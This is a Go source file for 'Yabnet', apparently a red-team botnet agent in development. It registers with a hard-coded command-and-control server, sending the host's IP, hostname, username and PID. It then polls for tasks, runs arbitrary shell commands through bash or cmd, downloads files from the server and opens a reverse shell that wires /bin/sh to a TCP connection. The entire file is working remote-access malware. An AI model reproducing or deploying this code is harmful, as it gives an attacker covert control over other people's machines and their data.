/*
Yabnet's agent program, written in go.

Current file is in construction and in debugging mode. Still learning golang...
*/

package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"strconv"
	"strings"
	"time"
	//"reflect"
	//"math/rand"
)

var registerkey string

// Global Variable Declaration
var SERVERIP string = "192.168.204.153"
var PORT string = "4444"
var FIRSTCONTACTKEY string = "dudeOurRedteamalreadyhaslike30C2already-Friend"
var URL string = "http://" + SERVERIP + ":" + PORT

var BOTID string

func GetOutboundIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	defer conn.Close()
	localAddr := conn.LocalAddr().String()
	idx := strings.LastIndex(localAddr, ":")

	return localAddr[0:idx]
}

// Return error type for error checking?
// Think about os.Exit(1) in the error checking down below
func simplePost(endpoint string, data url.Values) (map[string]interface{}, error) {
	response, err := http.PostForm(endpoint, data)

	if err != nil {
		//fmt.Println("[-] Error: ", err)
		return nil, errors.New("[-] Cannot connect to server")
	}

	defer response.Body.Close()
	body, err := ioutil.ReadAll(response.Body)

	if err != nil {
		//fmt.Println("[-] Error:", err)
		return nil, errors.New("[-] Cannot connect to server")
	}

	responseBody := string(body)

	var jsonData map[string]interface{}
	json.Unmarshal([]byte(responseBody), &jsonData)

	//fmt.Println(jsonData["result"])

	return jsonData, nil
}

func firstContact() string {
	endpoint := URL + "/firstcontact"

	var data = url.Values{"firstcontactkey": {FIRSTCONTACTKEY}}
	jsonData, err := simplePost(endpoint, data)

	if err != nil {
		return err.Error()
	}

	if jsonData["result"] == "success" {
		return jsonData["registerkey"].(string)
	} else {
		return jsonData["result"].(string)
	}
}

func register(registerkey string, ip string, os_name string, user string, pid string) (bool, string) {
	endpoint := URL + "/register"

	var data = url.Values{
		"registerkey": {registerkey},
		"ip":          {ip},
		"os":          {os_name},
		"user":        {user},
		"pid":         {pid}}

	jsonData, err := simplePost(endpoint, data)

	if err != nil {
		return false, ""
	}

	//fmt.Println(jsonData["botid"])
	//fmt.Println(reflect.TypeOf(jsonData["botid"]))

	botid := fmt.Sprint(jsonData["botid"])

	if jsonData["result"] == "success" {
		return true, botid
	} else {
		//fmt.Println(jsonData["error"])
		return false, ""
	}
}

/*
	0 = connection failed
	1 = heartbeat successful
	2 = heartbeat failed
*/
func heartbeat(registerkey string, ip string, pid string) int {
	endpoint := URL + "/heartbeat"

	var data = url.Values{
		"registerkey": {registerkey},
		"ip":          {ip},
		"pid":         {pid}}

	jsonData, err := simplePost(endpoint, data)

	if err != nil {
		return 0
	}

	if jsonData["result"] == "success" {
		return 1
	} else {
		return 2
	}

}

func fetchCommand(registerkey string, botid string) string {
	endpoint := URL + "/bot/" + botid + "/task"

	var data = url.Values{"registerkey": {registerkey}}

	jsonData, err := simplePost(endpoint, data)

	if err != nil {
		return err.Error()
	}

	if jsonData["result"] == "success" {
		//fmt.Println("[Debug]", jsonData["command"])
		return jsonData["command"].(string)
	} else {
		return jsonData["error"].(string)
	}

}

/*
	Description: Executes commands that was fetched from the server.
	The commands are categorized as "upload", "download", "shell", and simple_exec.
	The function currently only supports simple_exec
*/

func submitResult(registerkey string, botid string, result string) {
	endpoint := URL + "/bot/" + botid + "/result"

	var data = url.Values{
		"registerkey": {registerkey},
		"result":      {result}}

	simplePost(endpoint, data)
	//fmt.Println(jsonData)
}

func reverseshell(serverip string, port string) {
	server := serverip + ":" + port
	conn, _ := net.Dial("tcp", server)
	cmd := exec.Command("/bin/sh")
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Run()
}

func download(endpoint string, destination string) (err error) {
	resp, err := http.Get(endpoint)
	if err != nil {
		return
	}
	defer resp.Body.Close()

	f, err := os.Create(destination)
	if err != nil {
		return
	}
	defer f.Close()

	_, err = io.Copy(f, resp.Body)
	return
}

/*
Description: Executes commands that was fetched from the server.
The commands are categorized as "upload", "download", "shell", and simple_exec.
The function currently only supports simple_exec
*/

// TODO: Work on this function
func executeCommand(command string) string {
	//argstr := []string("-c", command)
	//out, err := exec.Command("/bin/bash", argstr).Output()
	//if err != nil {
	//	fmt.Println(err)
	//}
	commandSlice := strings.Split(command, " ")

	// Download file and save it into the local disk
	if commandSlice[0] == "download" {
		endpoint := URL + "/download/" + commandSlice[1]
		download(endpoint, commandSlice[2])
		return "[+] Download successful."

		// Launch a reverse shell
	} else if commandSlice[0] == "shell" {
		port := commandSlice[1]
		go reverseshell(SERVERIP, port)
		return "[+] Reverse shell successful."

		// Execute a simple bash command, and return the output to /result endpoint
	} else {
		if runtime.GOOS == "windows" {
			out, err := exec.Command("cmd", "/C", command).CombinedOutput()
			if err != nil {
				return err.Error() + string(out)
			}
			return string(out)
		} else {
			out, err := exec.Command("/bin/bash", "-c", command).CombinedOutput()
			if err != nil {
				return err.Error() + string(out)
			}
			return string(out)
		}
	}
}

func main() {
	ip := GetOutboundIP()
	user, _ := user.Current()
	os_name, _ := os.Hostname()
	username := user.Username
	pid := strconv.Itoa(os.Getpid())

	registerkey = firstContact()
	if strings.Contains(registerkey, "[-]") {
		for i := 1; i < 9999; i++ {
			fmt.Println("[-] Cannot connect to server. Retrying...")
			registerkey = firstContact()
			if !strings.Contains(registerkey, "[-]") {
				break
			}

			// implement later
			//rand.Seed(time.Now().UnixNano())
			//interval := rand.Intn((50-30+1) + 20)
			time.Sleep(10 * time.Second)
		}
	}

	//fmt.Println("[+] Registerkey = ", registerkey)
	register_result, botid := register(registerkey, ip, os_name, username, pid)
	BOTID = botid

	// Register was not successful. Retry registering for 5 times again
	if register_result == false {
		for i := 1; i < 30; i++ {
			registerkey = firstContact()
			register_result, botid := register(registerkey, ip, os_name, username, pid)
			BOTID = botid
			if register_result == true {
				break
			}
			time.Sleep(10 * time.Second)
		}
	}

	// Register was successful
	for {
		heartbeat_result := heartbeat(registerkey, ip, pid)

		// Heartbeat failed. Retry heartbeat for 30 minutes
		if heartbeat_result == 0 {
			for i := 1; i < 180; i++ {
				heartbeat_result := heartbeat(registerkey, ip, pid)
				if heartbeat_result == 2 {
					break
				}
				time.Sleep(10 * time.Second)
			}

			registerkey = firstContact()
			_, botid := register(registerkey, ip, os_name, username, pid)
			BOTID = botid
		}

		// Everything is fine. Try to fetch command.
		command := fetchCommand(registerkey, BOTID)

		if strings.Contains(command, "[-]") == true {
			time.Sleep(10 * time.Second)
			continue
		}

		execute_result := executeCommand(command)
		//fmt.Println("[DEBUG] result = ", execute_result)
		submitResult(registerkey, BOTID, execute_result)

		time.Sleep(10 * time.Second)

	}

}
